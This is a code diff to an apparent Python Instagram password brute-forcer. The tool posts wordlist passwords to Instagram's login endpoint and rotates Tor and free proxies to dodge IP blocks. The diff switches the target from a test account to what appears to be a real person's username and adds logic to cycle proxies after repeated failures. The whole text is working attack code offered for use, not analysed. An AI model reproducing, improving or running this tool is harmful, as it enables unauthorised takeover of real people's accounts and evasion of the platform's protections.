@@ -24,6 +24,7 @@ try:
 except ImportError:
     import queue as Queue
 
+stcount = 0;
 
 ipcheck_url = 'http://checkip.amazonaws.com/'
 num = 1;
@@ -44,12 +45,23 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+khas = 0;
+
+
+def startcount():
+    global stcount;
+    if stcount < 10:
+        stcount = stcount +1
+    if stcount == 11:
+        stcount = 0;
+        
 def changeproxy():
     global proxies;
+    global khas;
     ase = num
-    khas = 1;
     proxies2 = {
-    'https': 'socks5h://127.0.0.1:9050'
+    'https': 'socks5h://127.0.0.1:9050',
+    'http' : 'socks5h://127.0.0.1:9050'
     }
     url = "https://api.getproxylist.com/proxy?protocol=http&?allowsPost=1&?allowsRefererHeader=1&?allowsUserAgentHeader=1&?allowsCustomHeaders=1&?allowsCookies=1"
     r = requests.get(url,proxies=proxies2)
@@ -70,6 +82,7 @@ def changeproxy():
     sasas = sqqw.content;
     if https or http in sasas:
         print(bcolors.OKGREEN+'ip changed')
+        khas = khas+1;
     else:
         print('proxy not change tryagain')
         changeproxy()
@@ -125,7 +138,7 @@ def start_brute():
     print(bcolors.OKGREEN+'START CRACKING ..... |+|')
     for line in s:
         password = line.strip()
-        r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"sinatestcrack3","password":password},headers=header,proxies=proxies)
+        r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"hosnaa.83","password":password},headers=header,proxies=proxies)
         content = r.content;
         if "checkpoint_required" in content:
             print(bcolors.OKGREEN+'password found but need checkpoint | '+password)
@@ -134,12 +147,18 @@ def start_brute():
             print(bcolors.FAIL + 'IP Blocked')
             changeglobal()
             changeproxy()
+            print(khas)
             pass;
         if "authenticated: true" not in content:
+            if khas > 0:
+                startcount()
+                if stcount > 10:
+                    changeproxy()
+                    pass;
             print(bcolors.FAIL + "Incorrect |-| "+password)
             print(content)
         if "userId" in content:
-            print(bcolors.OKGREEN + 'Paired Found |+| '+ password)
+            print(bcolors.OKGREEN + '============================\r\n  Paired Found |+| '+ password +'\r\n ============================')
             break;
 
 
